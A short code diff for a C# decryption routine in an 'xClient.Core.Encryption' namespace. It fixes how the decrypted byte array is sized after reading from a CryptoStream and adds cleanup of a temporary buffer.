@@ -147,7 +147,7 @@ namespace xClient.Core.Encryption
 
         public static byte[] Decrypt(byte[] input, byte[] keyy)
         {
-            byte[] key, data;
+            byte[] key, temp, data;
 
             try
             {
@@ -167,8 +167,10 @@ namespace xClient.Core.Encryption
 
                         using (var cs = new CryptoStream(ms, rd.CreateDecryptor(), CryptoStreamMode.Read))
                         {
-                            data = new byte[ms.Length - IVLENGTH + 1];
-                            cs.Read(data, 0, data.Length);
+                            temp = new byte[ms.Length - IVLENGTH + 1];
+                            int read = cs.Read(temp, 0, temp.Length);
+                            data = new byte[read];
+                            Buffer.BlockCopy(temp, 0, data, 0, read);
                         }
 
                         iv = null;
@@ -183,6 +185,7 @@ namespace xClient.Core.Encryption
             }
             finally
             {
+                temp = null;
                 data = null;
                 key = null;
             }
